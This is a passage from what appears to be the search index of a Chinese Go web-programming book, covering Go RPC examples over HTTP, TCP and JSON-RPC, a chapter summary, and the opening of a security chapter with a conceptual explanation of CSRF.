\u901a\u8fc7\u4e0a\u9762\u7684\u4f8b\u5b50\u53ef\u4ee5\u770b\u5230\uff0c\u6211\u4eec\u6ce8\u518c\u4e86\u4e00\u4e2aArith\u7684RPC\u670d\u52a1\uff0c\u7136\u540e\u901a\u8fc7<code>rpc.HandleHTTP</code>\u51fd\u6570\u628a\u8be5\u670d\u52a1\u6ce8\u518c\u5230\u4e86HTTP\u534f\u8bae\u4e0a\uff0c\u7136\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528http\u7684\u65b9\u5f0f\u6765\u4f20\u9012\u6570\u636e\u4e86\u3002</p> <p>\u8bf7\u770b\u4e0b\u9762\u7684\u5ba2\u6237\u7aef\u4ee3\u7801\uff1a</p> <p><pre><code>package main\n\nimport (\n\"fmt\"\n\"log\"\n\"net/rpc\"\n\"os\"\n)\n\ntype Args struct {\nA, B int\n}\n\ntype Quotient struct {\nQuo, Rem int\n}\n\nfunc main() {\nif len(os.Args) != 2 {\nfmt.Println(\"Usage: \", os.Args[0], \"server\")\nos.Exit(1)\n}\nserverAddress := os.Args[1]\n\nclient, err := rpc.DialHTTP(\"tcp\", serverAddress+\":1234\")\nif err != nil {\nlog.Fatal(\"dialing:\", err)\n}\n// Synchronous call\nargs := Args{17, 8}\nvar reply int\nerr = client.Call(\"Arith.Multiply\", args, &amp;reply)\nif err != nil {\nlog.Fatal(\"arith error:\", err)\n}\nfmt.Printf(\"Arith: %d*%d=%d\\n\", args.A, args.B, reply)\n\nvar quot Quotient\nerr = client.Call(\"Arith.Divide\", args, &amp;quot)\nif err != nil {\nlog.Fatal(\"arith error:\", err)\n}\nfmt.Printf(\"Arith: %d/%d=%d remainder %d\\n\", args.A, args.B, quot.Quo, quot.Rem)\n\n}\n</code></pre> \u6211\u4eec\u628a\u4e0a\u9762\u7684\u670d\u52a1\u7aef\u548c\u5ba2\u6237\u7aef\u7684\u4ee3\u7801\u5206\u522b\u7f16\u8bd1\uff0c\u7136\u540e\u5148\u628a\u670d\u52a1\u7aef\u5f00\u542f\uff0c\u7136\u540e\u5f00\u542f\u5ba2\u6237\u7aef\uff0c\u8f93\u5165\u4ee3\u7801\uff0c\u5c31\u4f1a\u8f93\u51fa\u5982\u4e0b\u4fe1\u606f\uff1a <pre><code>$ ./http_c localhost\nArith: 17*8=136\nArith: 17/8=2 remainder 1\n</code></pre> \u901a\u8fc7\u4e0a\u9762\u7684\u8c03\u7528\u53ef\u4ee5\u770b\u5230\u53c2\u6570\u548c\u8fd4\u56de\u503c\u662f\u6211\u4eec\u5b9a\u4e49\u7684struct\u7c7b\u578b\uff0c\u5728\u670d\u52a1\u7aef\u6211\u4eec\u628a\u5b83\u4eec\u5f53\u505a\u8c03\u7528\u51fd\u6570\u7684\u53c2\u6570\u7684\u7c7b\u578b\uff0c\u5728\u5ba2\u6237\u7aef\u4f5c\u4e3a<code>client.Call</code>\u7684\u7b2c2\uff0c3\u4e24\u4e2a\u53c2\u6570\u7684\u7c7b\u578b\u3002\u5ba2\u6237\u7aef\u6700\u91cd\u8981\u7684\u5c31\u662f\u8fd9\u4e2aCall\u51fd\u6570\uff0c\u5b83\u67093\u4e2a\u53c2\u6570\uff0c\u7b2c1\u4e2a\u8981\u8c03\u7528\u7684\u51fd\u6570\u7684\u540d\u5b57\uff0c\u7b2c2\u4e2a\u662f\u8981\u4f20\u9012\u7684\u53c2\u6570\uff0c\u7b2c3\u4e2a\u8981\u8fd4\u56de\u7684\u53c2\u6570(\u6ce8\u610f\u662f\u6307\u9488\u7c7b\u578b)\uff0c\u901a\u8fc7\u4e0a\u9762\u7684\u4ee3\u7801\u4f8b\u5b50\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\uff0c\u4f7f\u7528Go\u7684RPC\u5b9e\u73b0\u76f8\u5f53\u7684\u7b80\u5355\uff0c\u65b9\u4fbf\u3002</p>"},{"location":"08.4/#tcp-rpc","title":"TCP RPC","text":"<p>\u4e0a\u9762\u6211\u4eec\u5b9e\u73b0\u4e86\u57fa\u4e8eHTTP\u534f\u8bae\u7684RPC\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u8981\u5b9e\u73b0\u57fa\u4e8eTCP\u534f\u8bae\u7684RPC\uff0c\u670d\u52a1\u7aef\u7684\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\u6240\u793a\uff1a <pre><code>package main\n\nimport (\n\"errors\"\n\"fmt\"\n\"net\"\n\"net/rpc\"\n\"os\"\n)\n\ntype Args struct {\nA, B int\n}\n\ntype Quotient struct {\nQuo, Rem int\n}\n\ntype Arith int\n\nfunc (t *Arith) Multiply(args *Args, reply *int) error {\n*reply = args.A * args.B\nreturn nil\n}\n\nfunc (t *Arith) Divide(args *Args, quo *Quotient) error {\nif args.B == 0 {\nreturn errors.New(\"divide by zero\")\n}\nquo.Quo = args.A / args.B\nquo.Rem = args.A % args.B\nreturn nil\n}\n\nfunc main() {\n\narith := new(Arith)\nrpc.Register(arith)\n\ntcpAddr, err := net.ResolveTCPAddr(\"tcp\", \":1234\")\ncheckError(err)\n\nlistener, err := net.ListenTCP(\"tcp\", tcpAddr)\ncheckError(err)\n\nfor {\nconn, err := listener.Accept()\nif err != nil {\ncontinue\n}\nrpc.ServeConn(conn)\n}\n\n}\n\nfunc checkError(err error) {\nif err != nil {\nfmt.Println(\"Fatal error \", err.Error())\nos.Exit(1)\n}\n}\n</code></pre> \u4e0a\u9762\u8fd9\u4e2a\u4ee3\u7801\u548chttp\u7684\u670d\u52a1\u5668\u76f8\u6bd4\uff0c\u4e0d\u540c\u5728\u4e8e:\u5728\u6b64\u5904\u6211\u4eec\u91c7\u7528\u4e86TCP\u534f\u8bae\uff0c\u7136\u540e\u9700\u8981\u81ea\u5df1\u63a7\u5236\u8fde\u63a5\uff0c\u5f53\u6709\u5ba2\u6237\u7aef\u8fde\u63a5\u4e0a\u6765\u540e\uff0c\u6211\u4eec\u9700\u8981\u628a\u8fd9\u4e2a\u8fde\u63a5\u4ea4\u7ed9rpc\u6765\u5904\u7406\u3002</p> <p>\u5982\u679c\u4f60\u7559\u5fc3\u4e86\uff0c\u4f60\u4f1a\u53d1\u73b0\u8fd9\u5b83\u662f\u4e00\u4e2a\u963b\u585e\u578b\u7684\u5355\u7528\u6237\u7684\u7a0b\u5e8f\uff0c\u5982\u679c\u60f3\u8981\u5b9e\u73b0\u591a\u5e76\u53d1\uff0c\u90a3\u4e48\u53ef\u4ee5\u4f7f\u7528goroutine\u6765\u5b9e\u73b0\uff0c\u6211\u4eec\u524d\u9762\u5728socket\u5c0f\u8282\u7684\u65f6\u5019\u5df2\u7ecf\u4ecb\u7ecd\u8fc7\u5982\u4f55\u5904\u7406goroutine\u3002 \u4e0b\u9762\u5c55\u73b0\u4e86TCP\u5b9e\u73b0\u7684RPC\u5ba2\u6237\u7aef\uff1a</p> <p><pre><code>package main\n\nimport (\n\"fmt\"\n\"log\"\n\"net/rpc\"\n\"os\"\n)\n\ntype Args struct {\nA, B int\n}\n\ntype Quotient struct {\nQuo, Rem int\n}\n\nfunc main() {\nif len(os.Args) != 2 {\nfmt.Println(\"Usage: \", os.Args[0], \"server:port\")\nos.Exit(1)\n}\nservice := os.Args[1]\n\nclient, err := rpc.Dial(\"tcp\", service)\nif err != nil {\nlog.Fatal(\"dialing:\", err)\n}\n// Synchronous call\nargs := Args{17, 8}\nvar reply int\nerr = client.Call(\"Arith.Multiply\", args, &amp;reply)\nif err != nil {\nlog.Fatal(\"arith error:\", err)\n}\nfmt.Printf(\"Arith: %d*%d=%d\\n\", args.A, args.B, reply)\n\nvar quot Quotient\nerr = client.Call(\"Arith.Divide\", args, &amp;quot)\nif err != nil {\nlog.Fatal(\"arith error:\", err)\n}\nfmt.Printf(\"Arith: %d/%d=%d remainder %d\\n\", args.A, args.B, quot.Quo, quot.Rem)\n\n}\n</code></pre> \u8fd9\u4e2a\u5ba2\u6237\u7aef\u4ee3\u7801\u548chttp\u7684\u5ba2\u6237\u7aef\u4ee3\u7801\u5bf9\u6bd4\uff0c\u552f\u4e00\u7684\u533a\u522b\u4e00\u4e2a\u662fDialHTTP\uff0c\u4e00\u4e2a\u662fDial(tcp)\uff0c\u5176\u4ed6\u5904\u7406\u4e00\u6a21\u4e00\u6837\u3002</p>"},{"location":"08.4/#json-rpc","title":"JSON RPC","text":"<p>JSON RPC\u662f\u6570\u636e\u7f16\u7801\u91c7\u7528\u4e86JSON\uff0c\u800c\u4e0d\u662fgob\u7f16\u7801\uff0c\u5176\u4ed6\u548c\u4e0a\u9762\u4ecb\u7ecd\u7684RPC\u6982\u5ff5\u4e00\u6a21\u4e00\u6837\uff0c\u4e0b\u9762\u6211\u4eec\u6765\u6f14\u793a\u4e00\u4e0b\uff0c\u5982\u4f55\u4f7f\u7528Go\u63d0\u4f9b\u7684json-rpc\u6807\u51c6\u5305\uff0c\u8bf7\u770b\u670d\u52a1\u7aef\u4ee3\u7801\u7684\u5b9e\u73b0\uff1a</p> <p><pre><code>package main\n\nimport (\n\"errors\"\n\"fmt\"\n\"net\"\n\"net/rpc\"\n\"net/rpc/jsonrpc\"\n\"os\"\n)\n\ntype Args struct {\nA, B int\n}\n\ntype Quotient struct {\nQuo, Rem int\n}\n\ntype Arith int\n\nfunc (t *Arith) Multiply(args *Args, reply *int) error {\n*reply = args.A * args.B\nreturn nil\n}\n\nfunc (t *Arith) Divide(args *Args, quo *Quotient) error {\nif args.B == 0 {\nreturn errors.New(\"divide by zero\")\n}\nquo.Quo = args.A / args.B\nquo.Rem = args.A % args.B\nreturn nil\n}\n\nfunc main() {\n\narith := new(Arith)\nrpc.Register(arith)\n\ntcpAddr, err := net.ResolveTCPAddr(\"tcp\", \":1234\")\ncheckError(err)\n\nlistener, err := net.ListenTCP(\"tcp\", tcpAddr)\ncheckError(err)\n\nfor {\nconn, err := listener.Accept()\nif err != nil {\ncontinue\n}\njsonrpc.ServeConn(conn)\n}\n\n}\n\nfunc checkError(err error) {\nif err != nil {\nfmt.Println(\"Fatal error \", err.Error())\nos.Exit(1)\n}\n}\n</code></pre> \u901a\u8fc7\u793a\u4f8b\u6211\u4eec\u53ef\u4ee5\u770b\u51fa json-rpc\u662f\u57fa\u4e8eTCP\u534f\u8bae\u5b9e\u73b0\u7684\uff0c\u76ee\u524d\u5b83\u8fd8\u4e0d\u652f\u6301HTTP\u65b9\u5f0f\u3002</p> <p>\u8bf7\u770b\u5ba2\u6237\u7aef\u7684\u5b9e\u73b0\u4ee3\u7801\uff1a <pre><code>package main\n\nimport (\n\"fmt\"\n\"log\"\n\"net/rpc/jsonrpc\"\n\"os\"\n)\n\ntype Args struct {\nA, B int\n}\n\ntype Quotient struct {\nQuo, Rem int\n}\n\nfunc main() {\nif len(os.Args) != 2 {\nfmt.Println(\"Usage: \", os.Args[0], \"server:port\")\nlog.Fatal(1)\n}\nservice := os.Args[1]\n\nclient, err := jsonrpc.Dial(\"tcp\", service)\nif err != nil {\nlog.Fatal(\"dialing:\", err)\n}\n// Synchronous call\nargs := Args{17, 8}\nvar reply int\nerr = client.Call(\"Arith.Multiply\", args, &amp;reply)\nif err != nil {\nlog.Fatal(\"arith error:\", err)\n}\nfmt.Printf(\"Arith: %d*%d=%d\\n\", args.A, args.B, reply)\n\nvar quot Quotient\nerr = client.Call(\"Arith.Divide\", args, &amp;quot)\nif err != nil {\nlog.Fatal(\"arith error:\", err)\n}\nfmt.Printf(\"Arith: %d/%d=%d remainder %d\\n\", args.A, args.B, quot.Quo, quot.Rem)\n\n}\n</code></pre></p>"},{"location":"08.4/#_1","title":"\u603b\u7ed3","text":"<p>Go\u5df2\u7ecf\u63d0\u4f9b\u4e86\u5bf9RPC\u7684\u826f\u597d\u652f\u6301\uff0c\u901a\u8fc7\u4e0a\u9762HTTP\u3001TCP\u3001JSON RPC\u7684\u5b9e\u73b0,\u6211\u4eec\u5c31\u53ef\u4ee5\u5f88\u65b9\u4fbf\u7684\u5f00\u53d1\u5f88\u591a\u5206\u5e03\u5f0f\u7684Web\u5e94\u7528\uff0c\u6211\u60f3\u4f5c\u4e3a\u8bfb\u8005\u7684\u4f60\u5df2\u7ecf\u9886\u4f1a\u5230\u8fd9\u4e00\u70b9\u3002\u4f46\u9057\u61be\u7684\u662f\u76ee\u524dGo\u5c1a\u672a\u63d0\u4f9b\u5bf9SOAP RPC\u7684\u652f\u6301\uff0c\u6b23\u6170\u7684\u662f\u73b0\u5728\u5df2\u7ecf\u6709\u7b2c\u4e09\u65b9\u7684\u5f00\u6e90\u5b9e\u73b0\u4e86\u3002</p>"},{"location":"08.4/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: REST</li> <li>\u4e0b\u4e00\u8282: \u5c0f\u7ed3</li> </ul>"},{"location":"08.5/","title":"8.5 \u5c0f\u7ed3","text":"<p>\u8fd9\u4e00\u7ae0\u6211\u4eec\u4ecb\u7ecd\u4e86\u76ee\u524d\u6d41\u884c\u7684\u51e0\u79cd\u4e3b\u8981\u7684\u7f51\u7edc\u5e94\u7528\u5f00\u53d1\u65b9\u5f0f\uff0c\u7b2c\u4e00\u5c0f\u8282\u4ecb\u7ecd\u4e86\u7f51\u7edc\u7f16\u7a0b\u4e2d\u7684\u57fa\u7840:Socket\u7f16\u7a0b\uff0c\u56e0\u4e3a\u73b0\u5728\u7f51\u7edc\u6b63\u5728\u671d\u4e91\u7684\u65b9\u5411\u5feb\u901f\u8fdb\u5316\uff0c\u4f5c\u4e3a\u8fd9\u4e00\u6280\u672f\u6f14\u8fdb\u7684\u57fa\u77f3\u7684\u7684socket\u77e5\u8bc6\uff0c\u4f5c\u4e3a\u5f00\u53d1\u8005\u7684\u4f60\uff0c\u662f\u5fc5\u987b\u8981\u638c\u63e1\u7684\u3002\u7b2c\u4e8c\u5c0f\u8282\u4ecb\u7ecd\u4e86\u6b63\u6108\u53d1\u6d41\u884c\u7684HTML5\u4e2d\u4e00\u4e2a\u91cd\u8981\u7684\u7279\u6027WebSocket\uff0c\u901a\u8fc7\u5b83,\u670d\u52a1\u5668\u53ef\u4ee5\u5b9e\u73b0\u4e3b\u52a8\u7684push\u6d88\u606f\uff0c\u4ee5\u7b80\u5316\u4ee5\u524dajax\u8f6e\u8be2\u7684\u6a21\u5f0f\u3002\u7b2c\u4e09\u5c0f\u8282\u4ecb\u7ecd\u4e86REST\u7f16\u5199\u6a21\u5f0f\uff0c\u8fd9\u79cd\u6a21\u5f0f\u7279\u522b\u9002\u5408\u6765\u5f00\u53d1\u7f51\u7edc\u5e94\u7528API\uff0c\u76ee\u524d\u79fb\u52a8\u5e94\u7528\u7684\u5feb\u901f\u53d1\u5c55\uff0c\u6211\u89c9\u5f97\u5c06\u6765\u4f1a\u662f\u4e00\u4e2a\u6f6e\u6d41\u3002\u7b2c\u56db\u5c0f\u8282\u4ecb\u7ecd\u4e86Go\u5b9e\u73b0\u7684RPC\u76f8\u5173\u77e5\u8bc6\uff0c\u5bf9\u4e8e\u4e0a\u9762\u56db\u79cd\u5f00\u53d1\u65b9\u5f0f\uff0cGo\u90fd\u5df2\u7ecf\u63d0\u4f9b\u4e86\u826f\u597d\u7684\u652f\u6301\uff0cnet\u5305\u53ca\u5176\u5b50\u5305,\u662f\u6240\u6709\u6d89\u53ca\u5230\u7f51\u7edc\u7f16\u7a0b\u7684\u5de5\u5177\u7684\u6240\u5728\u5730\u3002\u5982\u679c\u4f60\u60f3\u66f4\u52a0\u6df1\u5165\u7684\u4e86\u89e3\u76f8\u5173\u5b9e\u73b0\u7ec6\u8282\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u9605\u8bfb\u8fd9\u4e2a\u5305\u4e0b\u9762\u7684\u6e90\u7801\u3002</p>"},{"location":"08.5/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: RPC</li> <li>\u4e0b\u4e00\u7ae0: \u5b89\u5168\u4e0e\u52a0\u5bc6</li> </ul>"},{"location":"09.0/","title":"9 \u5b89\u5168\u4e0e\u52a0\u5bc6","text":"<p>\u65e0\u8bba\u662f\u5f00\u53d1Web\u5e94\u7528\u7684\u5f00\u53d1\u8005\u8fd8\u662f\u4f01\u56fe\u5229\u7528Web\u5e94\u7528\u6f0f\u6d1e\u7684\u653b\u51fb\u8005\uff0c\u5bf9\u4e8eWeb\u7a0b\u5e8f\u5b89\u5168\u8fd9\u4e2a\u8bdd\u9898\u90fd\u7ed9\u4e88\u4e86\u8d8a\u6765\u8d8a\u591a\u7684\u5173\u6ce8\u3002\u7279\u522b\u662f\u6700\u8fd1CSDN\u5bc6\u7801\u6cc4\u9732\u4e8b\u4ef6\uff0c\u66f4\u662f\u8ba9\u6211\u4eec\u5bf9Web\u5b89\u5168\u8fd9\u4e2a\u8bdd\u9898\u66f4\u52a0\u91cd\u89c6\uff0c\u6240\u6709\u4eba\u90fd\u8c08\u5bc6\u7801\u8272\u53d8\uff0c\u90fd\u5f00\u59cb\u68c0\u6d4b\u81ea\u5df1\u7684\u7cfb\u7edf\u662f\u5426\u5b58\u5728\u6f0f\u6d1e\u3002\u90a3\u4e48\u6211\u4eec\u4f5c\u4e3a\u4e00\u540dGo\u7a0b\u5e8f\u7684\u5f00\u53d1\u8005\uff0c\u4e00\u5b9a\u4e5f\u9700\u8981\u77e5\u9053\u6211\u4eec\u7684\u5e94\u7528\u7a0b\u5e8f\u968f\u65f6\u4f1a\u6210\u4e3a\u4f17\u591a\u653b\u51fb\u8005\u7684\u76ee\u6807\uff0c\u5e76\u63d0\u524d\u505a\u597d\u9632\u8303\u7684\u51c6\u5907\u3002</p> <p>\u5f88\u591aWeb\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u5b89\u5168\u95ee\u9898\u90fd\u662f\u7531\u4e8e\u8f7b\u4fe1\u4e86\u7b2c\u4e09\u65b9\u63d0\u4f9b\u7684\u6570\u636e\u9020\u6210\u7684\u3002\u6bd4\u5982\u5bf9\u4e8e\u7528\u6237\u7684\u8f93\u5165\u6570\u636e\uff0c\u5728\u5bf9\u5176\u8fdb\u884c\u9a8c\u8bc1\u4e4b\u524d\u90fd\u5e94\u8be5\u5c06\u5176\u89c6\u4e3a\u4e0d\u5b89\u5168\u7684\u6570\u636e\u3002\u5982\u679c\u76f4\u63a5\u628a\u8fd9\u4e9b\u4e0d\u5b89\u5168\u7684\u6570\u636e\u8f93\u51fa\u5230\u5ba2\u6237\u7aef\uff0c\u5c31\u53ef\u80fd\u9020\u6210\u8de8\u7ad9\u811a\u672c\u653b\u51fb(XSS)\u7684\u95ee\u9898\u3002\u5982\u679c\u628a\u4e0d\u5b89\u5168\u7684\u6570\u636e\u7528\u4e8e\u6570\u636e\u5e93\u67e5\u8be2\uff0c\u90a3\u4e48\u5c31\u53ef\u80fd\u9020\u6210SQL\u6ce8\u5165\u95ee\u9898\uff0c\u6211\u4eec\u5c06\u4f1a\u57289.3\u30019.4\u5c0f\u8282\u4ecb\u7ecd\u5982\u4f55\u907f\u514d\u8fd9\u4e9b\u95ee\u9898\u3002</p> <p>\u5728\u4f7f\u7528\u7b2c\u4e09\u65b9\u63d0\u4f9b\u7684\u6570\u636e\uff0c\u5305\u62ec\u7528\u6237\u63d0\u4f9b\u7684\u6570\u636e\u65f6\uff0c\u9996\u5148\u68c0\u9a8c\u8fd9\u4e9b\u6570\u636e\u7684\u5408\u6cd5\u6027\u975e\u5e38\u91cd\u8981\uff0c\u8fd9\u4e2a\u8fc7\u7a0b\u53eb\u505a\u8fc7\u6ee4\uff0c\u6211\u4eec\u5c06\u57289.2\u5c0f\u8282\u4ecb\u7ecd\u5982\u4f55\u4fdd\u8bc1\u5bf9\u6240\u6709\u8f93\u5165\u7684\u6570\u636e\u8fdb\u884c\u8fc7\u6ee4\u5904\u7406\u3002</p> <p>\u8fc7\u6ee4\u8f93\u5165\u548c\u8f6c\u4e49\u8f93\u51fa\u5e76\u4e0d\u80fd\u89e3\u51b3\u6240\u6709\u7684\u5b89\u5168\u95ee\u9898\uff0c\u6211\u4eec\u5c06\u4f1a\u57289.1\u8bb2\u89e3\u7684CSRF\u653b\u51fb\uff0c\u4f1a\u5bfc\u81f4\u53d7\u9a97\u8005\u53d1\u9001\u653b\u51fb\u8005\u6307\u5b9a\u7684\u8bf7\u6c42\u4ece\u800c\u9020\u6210\u4e00\u4e9b\u7834\u574f\u3002</p> <p>\u4e0e\u5b89\u5168\u52a0\u5bc6\u76f8\u5173\u7684\uff0c\u80fd\u591f\u589e\u5f3a\u6211\u4eec\u7684Web\u5e94\u7528\u7a0b\u5e8f\u7684\u5f3a\u5927\u624b\u6bb5\u5c31\u662f\u52a0\u5bc6\uff0cCSDN\u6cc4\u5bc6\u4e8b\u4ef6\u5c31\u662f\u56e0\u4e3a\u5bc6\u7801\u4fdd\u5b58\u7684\u662f\u660e\u6587\uff0c\u4f7f\u5f97\u653b\u51fb\u62ff\u624b\u5e93\u4e4b\u540e\u5c31\u53ef\u4ee5\u76f4\u63a5\u5b9e\u65bd\u4e00\u4e9b\u7834\u574f\u884c\u4e3a\u4e86\u3002\u4e0d\u8fc7\uff0c\u548c\u5176\u4ed6\u5de5\u5177\u4e00\u6837\uff0c\u52a0\u5bc6\u624b\u6bb5\u4e5f\u5fc5\u987b\u8fd0\u7528\u5f97\u5f53\u3002\u6211\u4eec\u5c06\u57289.5\u5c0f\u8282\u4ecb\u7ecd\u5982\u4f55\u5b58\u50a8\u5bc6\u7801\uff0c\u5982\u4f55\u8ba9\u5bc6\u7801\u5b58\u50a8\u7684\u5b89\u5168\u3002</p> <p>\u52a0\u5bc6\u7684\u672c\u8d28\u5c31\u662f\u6270\u4e71\u6570\u636e\uff0c\u67d0\u4e9b\u4e0d\u53ef\u6062\u590d\u7684\u6570\u636e\u6270\u4e71\u6211\u4eec\u79f0\u4e3a\u5355\u5411\u52a0\u5bc6\u6216\u8005\u6563\u5217\u7b97\u6cd5\u3002\u53e6\u5916\u8fd8\u6709\u4e00\u79cd\u53cc\u5411\u52a0\u5bc6\u65b9\u5f0f\uff0c\u4e5f\u5c31\u662f\u53ef\u4ee5\u5bf9\u52a0\u5bc6\u540e\u7684\u6570\u636e\u8fdb\u884c\u89e3\u5bc6\u3002\u6211\u4eec\u5c06\u4f1a\u57289.6\u5c0f\u8282\u4ecb\u7ecd\u5982\u4f55\u5b9e\u73b0\u8fd9\u79cd\u53cc\u5411\u52a0\u5bc6\u65b9\u5f0f\u3002</p>"},{"location":"09.0/#_1","title":"\u76ee\u5f55","text":""},{"location":"09.0/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u7ae0: \u7b2c\u516b\u7ae0\u603b\u7ed3</li> <li>\u4e0b\u4e00\u8282: \u9884\u9632CSRF\u653b\u51fb</li> </ul>"},{"location":"09.1/","title":"9.1 \u9884\u9632CSRF\u653b\u51fb","text":""},{"location":"09.1/#csrf","title":"\u4ec0\u4e48\u662fCSRF","text":"<p>CSRF\uff08Cross-site request forgery\uff09\uff0c\u4e2d\u6587\u540d\u79f0\uff1a\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\uff0c\u4e5f\u88ab\u79f0\u4e3a\uff1aone click attack/session riding\uff0c\u7f29\u5199\u4e3a\uff1aCSRF/XSRF\u3002</p> <p>\u90a3\u4e48CSRF\u5230\u5e95\u80fd\u591f\u5e72\u561b\u5462\uff1f\u4f60\u53ef\u4ee5\u8fd9\u6837\u7b80\u5355\u7684\u7406\u89e3\uff1a\u653b\u51fb\u8005\u53ef\u4ee5\u76d7\u7528\u4f60\u7684\u767b\u9646\u4fe1\u606f\uff0c\u4ee5\u4f60\u7684\u8eab\u4efd\u6a21\u62df\u53d1\u9001\u5404\u79cd\u8bf7\u6c42\u3002\u653b\u51fb\u8005\u53ea\u8981\u501f\u52a9\u5c11\u8bb8\u7684\u793e\u4f1a\u5de5\u7a0b\u5b66\u7684\u8be1\u8ba1\uff0c\u4f8b\u5982\u901a\u8fc7QQ\u7b49\u804a\u5929\u8f6f\u4ef6\u53d1\u9001\u7684\u94fe\u63a5(\u6709\u4e9b\u8fd8\u4f2a\u88c5\u6210\u77ed\u57df\u540d\uff0c\u7528\u6237\u65e0\u6cd5\u5206\u8fa8)\uff0c\u653b\u51fb\u8005\u5c31\u80fd\u8feb\u4f7fWeb\u5e94\u7528\u7684\u7528\u6237\u53bb\u6267\u884c\u653b\u51fb\u8005\u9884\u8bbe\u7684\u64cd\u4f5c\u3002\u4f8b\u5982\uff0c\u5f53\u7528\u6237\u767b\u5f55\u7f51\u7edc\u94f6\u884c\u53bb\u67e5\u770b\u5176\u5b58\u6b3e\u4f59\u989d\uff0c\u5728\u4ed6\u6ca1\u6709\u9000\u51fa\u65f6\uff0c\u5c31\u70b9\u51fb\u4e86\u4e00\u4e2aQQ\u597d\u53cb\u53d1\u6765\u7684\u94fe\u63a5\uff0c\u90a3\u4e48\u8be5\u7528\u6237\u94f6\u884c\u5e10\u6237\u4e2d\u7684\u8d44\u91d1\u5c31\u6709\u53ef\u80fd\u88ab\u8f6c\u79fb\u5230\u653b\u51fb\u8005\u6307\u5b9a\u7684\u5e10\u6237\u4e2d\u3002</p> <p>\u6240\u4ee5\u9047\u5230CSRF\u653b\u51fb\u65f6\uff0c\u5c06\u5bf9\u7ec8\u7aef\u7528\u6237\u7684\u6570\u636e\u548c\u64cd\u4f5c\u6307\u4ee4\u6784\u6210\u4e25\u91cd\u7684\u5a01\u80c1\uff1b\u5f53\u53d7\u653b\u51fb\u7684\u7ec8\u7aef\u7528\u6237\u5177\u6709\u7ba1\u7406\u5458\u5e10\u6237\u7684\u65f6\u5019\uff0cCSRF\u653b\u51fb\u5c06\u5371\u53ca\u6574\u4e2aWeb\u5e94\u7528\u7a0b\u5e8f\u3002</p>"},{"location":"09.1/#csrf_1","title":"CSRF\u7684\u539f\u7406","text":"<p>\u4e0b\u56fe\u7b80\u5355\u9610\u8ff0\u4e86CSRF\u653b\u51fb\u7684\u601d\u60f3</p> <p></p> <p>\u56fe9.1 CSRF\u7684\u653b\u51fb\u8fc7\u7a0b</p> <p>\u4ece\u4e0a\u56fe\u53ef\u4ee5\u770b\u51fa\uff0c\u8981\u5b8c\u6210\u4e00\u6b21CSRF\u653b\u51fb\uff0c\u53d7\u5bb3\u8005\u5fc5\u987b\u4f9d\u6b21\u5b8c\u6210\u4e24\u4e2a\u6b65\u9aa4 \uff1a</p> <ul> <li>1.\u767b\u5f55\u53d7\u4fe1\u4efb\u7f51\u7ad9A\uff0c\u5e76\u5728\u672c\u5730\u751f\u6210Cookie \u3002</li> <li>2.\u5728\u4e0d\u9000\u51faA\u7684\u60c5\u51b5\u4e0b\uff0c\u8bbf\u95ee\u5371\u9669\u7f51\u7ad9B\u3002</li> </ul> <p>\u770b\u5230\u8fd9\u91cc\uff0c\u8bfb\u8005\u4e5f\u8bb8\u4f1a\u95ee\uff1a\u201c\u5982\u679c\u6211\u4e0d\u6ee1\u8db3\u4ee5\u4e0a\u4e24\u4e2a\u6761\u4ef6\u4e2d\u7684\u4efb\u610f\u4e00\u4e2a\uff0c\u5c31\u4e0d\u4f1a\u53d7\u5230CSRF\u7684\u653b\u51fb\u201d\u3002\u662f\u7684\uff0c\u786e\u5b9e\u5982\u6b64\uff0c\u4f46\u4f60\u4e0d\u80fd\u4fdd\u8bc1\u4ee5\u4e0b\u60c5\u51b5\u4e0d\u4f1a\u53d1\u751f\uff1a</p> <ul> <li>\u4f60\u4e0d\u80fd\u4fdd\u8bc1\u4f60\u767b\u5f55\u4e86\u4e00\u4e2a\u7f51\u7ad9\u540e\uff0c\u4e0d\u518d\u6253\u5f00\u4e00\u4e2atab\u9875\u9762\u5e76\u8bbf\u95ee\u53e6\u5916\u7684\u7f51\u7ad9\uff0c\u7279\u522b\u73b0\u5728\u6d4f\u89c8\u5668\u90fd\u662f\u652f\u6301\u591atab\u7684\u3002</li> <li>\u4f60\u4e0d\u80fd\u4fdd\u8bc1\u4f60\u5173\u95ed\u6d4f\u89c8\u5668\u4e86\u540e\uff0c\u4f60\u672c\u5730\u7684Cookie\u7acb\u523b\u8fc7\u671f\uff0c\u4f60\u4e0a\u6b21\u7684\u4f1a\u8bdd\u5df2\u7ecf\u7ed3\u675f\u3002</li> <li>\u4e0a\u56fe\u4e2d\u6240\u8c13\u7684\u653b\u51fb\u7f51\u7ad9\uff0c\u53ef\u80fd\u662f\u4e00\u4e2a\u5b58\u5728\u5176\u4ed6\u6f0f\u6d1e\u7684\u53ef\u4fe1\u4efb\u7684\u7ecf\u5e38\u88ab\u4eba\u8bbf\u95ee\u7684\u7f51\u7ad9\u3002</li> </ul> <p>\u56e0\u6b64\u5bf9\u4e8e\u7528\u6237\u6765\u8bf4\u5f88\u96be\u907f\u514d\u5728\u767b\u9646\u4e00\u4e2a\u7f51\u7ad9\u4e4b\u540e\u4e0d\u70b9\u51fb\u4e00\u4e9b\u94fe\u63a5\u8fdb\u884c\u5176\u4ed6\u64cd\u4f5c\uff0c\u6240\u4ee5\u968f\u65f6\u53ef\u80fd\u6210\u4e3aCSRF\u7684\u53d7\u5bb3\u8005\u3002</p> 